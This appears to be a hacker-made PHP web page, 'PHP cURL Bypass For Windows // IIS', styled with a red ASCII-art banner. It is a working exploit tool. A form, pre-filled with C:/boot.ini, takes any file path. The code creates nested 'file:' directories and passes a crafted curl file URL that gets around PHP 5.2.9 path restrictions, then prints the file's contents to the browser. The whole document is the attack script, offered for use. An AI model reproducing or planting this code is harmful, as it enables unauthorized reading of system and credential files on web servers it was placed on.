<head>
<title>[+] PHP cURL Bypass For Windows // IIS </title>
<meta name="description" content="b0x">
</head>

<pre>
<font color="#FF0000">__________         ___ ___           .____       _____ __________        
\____    /___  ___/   |   \          |    |     /  _  \\______   \ ______
  /     / \  \/  /    ~    \  ______ |    |    /  /_\  \|    |  _//  ___/
 /     /_  >    <\    Y    / /_____/ |    |___/    |    \    |   \\___ \ 
/_______ \/__/\_ \\___|_  /          |_______ \____|__  /______  /____  >
        \/      \/      \/                   \/       \/       \/     \/ 
</font><form name="form" " method="post">
	<p align="left"></pre><font face="Tahoma" color="#FF0000">File</font> :
	<font size="3" face="Tahoma">
	<input name="file" size="50" value="C:/boot.ini" style="font-family: Tahoma; color: #FF0000; border: 1px dotted #FF0000">�
	<input type="submit" name="hardstylez" value="Read" style="font-family: Tahoma; color: #FF0000; border: 1px dotted #FF0000"></font></p>
</form>
	<? 
	
	
	# PHP cURL Bypasser 4 IIS
    # Based ON PHP 5.2.9 cURL Bypass
    # Greet'z 2 All Friend'z	
	
	
	
if(!empty($_GET['file'])) $file=$_GET['file'];
else if(!empty($_POST['file'])) $file=$_POST['file'];

 
$level=0;
 
if(!file_exists("file:"))
	@mkdir("file:");
@chdir("file:");
$level++;
 
$hardstyle = explode("/", $file);
 
for($a=0;$a<count($hardstyle);$a++){
	if(!empty($hardstyle[$a])){
		if(!file_exists($hardstyle[$a])) 
			@mkdir($hardstyle[$a]);
		@chdir($hardstyle[$a]);
		$level++;
	}
}
 
while($level--) chdir("..");
 
$ch = curl_init();
 
curl_setopt($ch, CURLOPT_URL, "file:file:\\".$file);
 
echo '<FONT COLOR="RED"> 
<textarea rows="40" cols="120" style="font-family: Tahoma; color: #FF0000; border: 1px dotted #FF0000" name="b0x">';
 
if(FALSE==curl_exec($ch))
	die('[+] Sorry... File '.htmlspecialchars($file).' doesnt exists or you dont have permissions.');
 
echo ' </textarea> </FONT>';
 
curl_close($ch);
 
 
?>
